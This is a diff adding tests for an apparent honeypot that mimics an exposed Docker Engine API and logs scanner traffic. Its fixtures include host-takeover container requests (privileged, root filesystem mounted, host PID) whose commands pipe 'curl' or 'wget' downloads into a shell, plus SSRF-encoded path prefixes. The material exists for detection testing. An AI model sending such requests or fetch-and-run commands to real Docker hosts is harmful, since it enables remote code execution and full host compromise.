@@ -562,6 +562,7 @@ def test_all_trap_families_default_on():
     assert tbenv.BARRACUDA_VPN_ENABLED
     assert tbenv.F5_BIGIP_ENABLED
     assert tbenv.DOCKER_REGISTRY_ENABLED
+    assert tbenv.DOCKER_DAEMON_ENABLED
     assert tbenv.NEXTJS_ENABLED
     assert tbenv.CMD_INJECTION_ENABLED
     assert tbenv.WEBAPP_FORM_ENABLED
@@ -3341,6 +3342,301 @@ async def test_dispatch_docker_registry_disabled_returns_404(flux_client, monkey
     resp = await flux_client.get(
         "/v2/_catalog",
         headers={"X-Forwarded-For": "203.0.113.200"},
+    )
+    assert resp.status == 404
+
+
+# --- Docker Engine API (daemon on 2375) trap ---
+
+
+def test_docker_daemon_enabled_by_default():
+    assert tbenv.DOCKER_DAEMON_ENABLED
+
+
+def test_docker_daemon_exact_endpoints():
+    for path in (
+        "/version",
+        "/info",
+        "/_ping",
+        "/containers/json",
+        "/images/json",
+        "/images/create",
+        "/containers/create",
+    ):
+        assert tbenv.is_docker_daemon_path(path), f"expected match: {path}"
+
+
+def test_docker_daemon_api_version_prefix():
+    for path in (
+        "/v1.41/version",
+        "/v1.43/containers/json",
+        "/v1.40/info",
+        "/v1.24/_ping",
+    ):
+        assert tbenv.is_docker_daemon_path(path), f"expected match: {path}"
+
+
+def test_docker_daemon_ssrf_colon_port_prefix():
+    # Literal `:2375`, single-encoded `%3a2375`, and double-encoded
+    # `%253a2375` — all observed shapes from SSRF / proxy-chain
+    # scanners that ship the host:port inside the URL path.
+    for path in (
+        "/:2375/containers/json",
+        "/%3a2375/containers/json",
+        "/%253a2375/containers/json",
+        "/%3A2375/version",          # uppercase encoding
+        "/%253A2375/_ping",
+    ):
+        assert tbenv.is_docker_daemon_path(path), f"expected match: {path}"
+
+
+def test_docker_daemon_container_stage_paths():
+    cid = "a" * 64
+    for stage in ("start", "stop", "kill", "wait", "exec", "json", "attach", "restart"):
+        assert tbenv.is_docker_daemon_path(f"/containers/{cid}/{stage}")
+    # Short (12-char) container ID — Docker CLI default form.
+    assert tbenv.is_docker_daemon_path("/containers/abcdef012345/start")
+
+
+def test_docker_daemon_exec_stage_paths():
+    exid = "b" * 64
+    for stage in ("start", "resize", "json"):
+        assert tbenv.is_docker_daemon_path(f"/exec/{exid}/{stage}")
+
+
+def test_docker_daemon_path_non_match():
+    for path in (
+        "/",
+        "/.env",
+        "/api/version",            # not the Docker shape
+        "/api/v2/version",
+        "/v2/_catalog",            # registry, separate trap
+        "/v1.41/.env",
+        "/containers/json.bak",
+        "/exec/start",             # missing exec ID
+        "/v1.41",                  # bare version prefix
+        "/containers/",            # bare prefix
+    ):
+        assert not tbenv.is_docker_daemon_path(path), f"unexpected match: {path}"
+
+
+def test_docker_daemon_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "DOCKER_DAEMON_ENABLED", False)
+    assert not tbenv.is_docker_daemon_path("/containers/json")
+    assert not tbenv.is_docker_daemon_path("/version")
+
+
+def test_docker_daemon_normalize_strips_prefixes():
+    assert tbenv._docker_daemon_normalize("/v1.43/containers/json") == "/containers/json"
+    assert tbenv._docker_daemon_normalize("/:2375/containers/json") == "/containers/json"
+    assert tbenv._docker_daemon_normalize("/%3a2375/v1.41/version") == "/version"
+    assert tbenv._docker_daemon_normalize("/%253a2375/v1.41/_ping") == "/_ping"
+    # Query string is stripped.
+    assert tbenv._docker_daemon_normalize("/images/create?fromImage=alpine&tag=latest") == "/images/create"
+
+
+def test_docker_daemon_parse_container_create_flags_host_takeover():
+    body = json.dumps({
+        "Image": "alpine:latest",
+        "Cmd": ["/bin/sh", "-c", "curl http://x/y.sh | sh"],
+        "HostConfig": {
+            "Privileged": True,
+            "Binds": ["/:/mnt/host"],
+            "PidMode": "host",
+            "NetworkMode": "host",
+            "CapAdd": ["SYS_ADMIN"],
+        },
+    })
+    flags = tbenv._docker_daemon_parse_container_create(body)
+    assert flags["dockerDaemonImage"] == "alpine:latest"
+    assert "curl" in flags["dockerDaemonCmd"]
+    assert flags["dockerDaemonHasPrivileged"] is True
+    assert flags["dockerDaemonHasHostMount"] is True
+    assert flags["dockerDaemonHasHostPid"] is True
+    assert flags["dockerDaemonHasHostNetwork"] is True
+    assert flags["dockerDaemonHasDangerousCap"] is True
+    assert flags["dockerDaemonHasShellPayload"] is True
+
+
+def test_docker_daemon_parse_container_create_substring_fallback():
+    # Trailing-comma body fails strict json.loads — substring fallback
+    # should still surface the host-takeover flags.
+    body = (
+        '{"Image":"ubuntu","HostConfig":{"Privileged":true,'
+        '"Binds":["/:/host"],},}'
+    )
+    flags = tbenv._docker_daemon_parse_container_create(body)
+    assert flags.get("dockerDaemonHasPrivileged") is True
+    assert flags.get("dockerDaemonHasHostMount") is True
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_version(flux_client):
+    resp = await flux_client.get(
+        "/version",
+        headers={"X-Forwarded-For": "203.0.113.210"},
+    )
+    assert resp.status == 200
+    assert resp.headers.get("Api-Version") == tbenv.DOCKER_DAEMON_API_VERSION
+    assert resp.headers.get("Server", "").startswith("Docker/")
+    body = await resp.json()
+    assert body["ApiVersion"] == tbenv.DOCKER_DAEMON_API_VERSION
+    assert body["Version"] == tbenv.DOCKER_DAEMON_ENGINE_VERSION
+    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-version"]
+    assert entries[-1]["dockerDaemonEndpoint"] == "/version"
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_info(flux_client):
+    resp = await flux_client.get(
+        "/info",
+        headers={"X-Forwarded-For": "203.0.113.211"},
+    )
+    assert resp.status == 200
+    body = await resp.json()
+    assert body["Driver"] == "overlay2"
+    assert body["ServerVersion"] == tbenv.DOCKER_DAEMON_ENGINE_VERSION
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_ping(flux_client):
+    resp = await flux_client.get(
+        "/_ping",
+        headers={"X-Forwarded-For": "203.0.113.212"},
+    )
+    assert resp.status == 200
+    body = await resp.read()
+    assert body == b"OK"
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_containers_list(flux_client):
+    resp = await flux_client.get(
+        "/containers/json",
+        headers={"X-Forwarded-For": "203.0.113.213"},
+    )
+    assert resp.status == 200
+    body = await resp.json()
+    assert body == []
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_ssrf_prefix_logged(flux_client):
+    # Double-URL-encoded `:2375` SSRF shape — flag should fire and the
+    # endpoint should resolve as if it were the bare /containers/json.
+    resp = await flux_client.get(
+        "/%253a2375/containers/json",
+        headers={"X-Forwarded-For": "203.0.113.214"},
+    )
+    assert resp.status == 200
+    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-containers-list"]
+    assert entries[-1]["dockerDaemonHasSsrfPrefix"] is True
+    assert entries[-1]["dockerDaemonEndpoint"] == "/containers/json"
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_api_version_prefix_logged(flux_client):
+    resp = await flux_client.get(
+        "/v1.41/version",
+        headers={"X-Forwarded-For": "203.0.113.215"},
+    )
+    assert resp.status == 200
+    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-version"]
+    assert entries[-1]["dockerDaemonApiVersionPrefix"] == "v1.41"
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_container_create_returns_id_and_flags_payload(flux_client):
+    body = json.dumps({
+        "Image": "alpine:latest",
+        "Cmd": ["/bin/sh", "-c", "wget http://x/y.sh -O- | sh"],
+        "HostConfig": {
+            "Privileged": True,
+            "Binds": ["/:/mnt"],
+            "PidMode": "host",
+        },
+    }).encode("utf-8")
+    resp = await flux_client.post(
+        "/containers/create",
+        headers={"X-Forwarded-For": "203.0.113.216", "Content-Type": "application/json"},
+        data=body,
+    )
+    assert resp.status == 201
+    payload = await resp.json()
+    assert payload["Id"]  # container ID was issued
+    cid = payload["Id"]
+    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-container-create"]
+    assert entries[-1]["dockerDaemonHasPrivileged"] is True
+    assert entries[-1]["dockerDaemonHasHostMount"] is True
+    assert entries[-1]["dockerDaemonHasHostPid"] is True
+    assert entries[-1]["dockerDaemonHasShellPayload"] is True
+    assert entries[-1]["dockerDaemonImage"] == "alpine:latest"
+    assert entries[-1]["dockerDaemonIssuedContainerId"] == cid
+    assert entries[-1]["dockerDaemonBodySha256"]
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_container_start_returns_204(flux_client):
+    cid = "f" * 64
+    resp = await flux_client.post(
+        f"/containers/{cid}/start",
+        headers={"X-Forwarded-For": "203.0.113.217"},
+    )
+    assert resp.status == 204
+    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-container-start"]
+    assert entries[-1]["dockerDaemonTargetContainerId"] == cid
+    assert entries[-1]["dockerDaemonStage"] == "start"
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_exec_create_then_start(flux_client):
+    cid = "0" * 64
+    body = json.dumps({"Cmd": ["/bin/sh", "-c", "id"], "AttachStdout": True}).encode("utf-8")
+    resp = await flux_client.post(
+        f"/containers/{cid}/exec",
+        headers={"X-Forwarded-For": "203.0.113.218", "Content-Type": "application/json"},
+        data=body,
+    )
+    assert resp.status == 201
+    payload = await resp.json()
+    exid = payload["Id"]
+    assert exid
+    resp2 = await flux_client.post(
+        f"/exec/{exid}/start",
+        headers={"X-Forwarded-For": "203.0.113.218", "Content-Type": "application/json"},
+        data=b'{"Detach":false,"Tty":false}',
+    )
+    assert resp2.status == 200
+    entries_exec_create = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-exec-create"]
+    assert entries_exec_create[-1]["dockerDaemonTargetContainerId"] == cid
+    assert entries_exec_create[-1]["dockerDaemonIssuedExecId"] == exid
+    entries_exec_start = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-exec-start"]
+    assert entries_exec_start[-1]["dockerDaemonTargetExecId"] == exid
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_auth_header_logged(flux_client):
+    # `X-Registry-Auth` is the Docker-specific header; the bare
+    # Authorization fallback also gets captured.
+    resp = await flux_client.post(
+        "/images/create?fromImage=alpine&tag=latest",
+        headers={
+            "X-Forwarded-For": "203.0.113.219",
+            "X-Registry-Auth": "eyJ1c2VybmFtZSI6InRlc3QifQ==",
+        },
+        data=b"",
+    )
+    assert resp.status == 200
+    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-image-pull"]
+    assert entries[-1]["dockerDaemonAuthHeader"].startswith("eyJ1c2VybmFtZSI")
+
+
+@pytest.mark.asyncio
+async def test_dispatch_docker_daemon_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "DOCKER_DAEMON_ENABLED", False)
+    resp = await flux_client.get(
+        "/containers/json",
+        headers={"X-Forwarded-For": "203.0.113.220"},
     )
     assert resp.status == 404
 
